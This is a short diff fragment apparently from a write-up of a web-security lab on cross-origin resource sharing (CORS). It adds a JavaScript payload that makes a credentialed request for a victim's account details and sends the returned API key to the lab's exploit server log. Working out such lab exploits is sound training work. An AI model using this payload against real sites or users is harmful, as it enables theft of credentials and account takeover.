@@ -27,3 +27,21 @@ Content-Length: 149
   ]
 }
 ```
+
+The following payload, delievered to the user, can be used to log their api key in the lab's exploit server:
+
+```javascript
+var xhr = new XMLHttpRequest()
+var url = 'https://acb81fbb1f7d870ec0f52ab300bf0064.web-security-academy.net'
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState == XMLHttpRequest.DONE) {
+    fetch('/log?key=' + xhr.responseText)
+  }
+}
+
+xhr.open('GET', url + '/accountDetails', true)
+xhr.withCredentials = true
+
+xhr.send(null)
+```
